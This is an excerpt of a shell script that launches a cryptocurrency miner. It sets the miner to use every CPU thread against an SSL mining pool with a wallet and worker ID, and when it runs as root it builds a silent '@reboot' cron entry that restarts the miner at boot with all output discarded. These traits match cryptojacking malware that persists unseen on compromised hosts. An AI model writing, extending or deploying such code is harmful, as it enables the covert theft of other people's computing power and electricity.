...
launch_miner() {
    THREADS=$(nproc 2>/dev/null || grep -c ^processor /proc/cpuinfo 2>/dev/null || echo 1)
    MINER_ARGS="-o ssl://${POOL} -u ${WALLET} -p ${WORKER} --no-color --donate-level=0 --threads=${THREADS}"
...
if [ "$(id -u)" = "0" ]; then
    OWN_NAME=$(basename "$BINARY_PATH")
    CRON_JOB="@reboot ${BINARY_PATH} -o ssl://${POOL} -u ${WALLET} -p ${WORKER} --no-color --donate-level=0 >/dev/null 2>&1"
